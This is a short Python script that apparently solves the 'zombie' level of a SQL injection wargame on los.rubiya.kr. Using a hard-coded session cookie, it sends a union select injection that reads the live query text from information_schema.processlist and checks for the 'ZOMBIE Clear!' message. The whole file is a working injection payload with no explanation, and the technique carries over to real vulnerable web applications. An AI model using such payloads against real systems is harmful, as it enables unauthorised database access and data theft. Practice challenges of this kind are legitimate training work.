import requests

url = 'https://los.rubiya.kr/chall/zombie_78238dee92f8ed0f508b0e9e00fc0e49.php?'
cookie = {'PHPSESSID':'2cus8abp8eb3greqqsrpgoupla'}

def solve():
    query = "pw='union select substr(info,38,69) from information_schema.processlist%23"
    res = requests.get(url=url+query,cookies=cookie)
    if "ZOMBIE Clear!" in res.text:
        print("ZOMBIE Clear!")

if __name__ == "__main__":
    solve()